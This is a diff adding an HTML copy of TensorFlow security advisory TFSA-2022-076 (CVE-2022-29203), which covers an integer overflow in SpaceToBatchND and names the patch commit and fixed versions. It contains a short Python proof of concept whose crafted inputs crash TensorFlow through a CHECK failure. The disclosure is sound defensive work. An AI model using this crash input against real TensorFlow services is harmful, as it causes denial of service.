@@ -1,0 +1,20 @@
+<h2>TFSA-2022-076: Integer overflow in <code>SpaceToBatchND</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-29203</p>
+<h3>Impact</h3>
+<p>The implementation of <code>tf.raw_ops.SpaceToBatchND</code> (in all backends such as XLA and handwritten kernels) is vulnerable to an integer overflow:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>input = tf.constant(-3.5e+35, shape=[10,19,22], dtype=tf.float32)
+block_shape = tf.constant(-1879048192, shape=[2], dtype=tf.int64)
+paddings = tf.constant(0, shape=[2,2], dtype=tf.int32)
+tf.raw_ops.SpaceToBatchND(input=input, block_shape=block_shape, paddings=paddings)
+```</p>
+<p>The result of this integer overflow is used to allocate the output tensor, hence we get a denial of service via a <code>CHECK</code>-failure (assertion failure), as in <a href="https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md">TFSA-2021-198</a>.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/acd56b8bcb72b163c834ae4f18469047b001fadf">acd56b8bcb72b163c834ae4f18469047b001fadf</a>.</p>
+<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.</p>
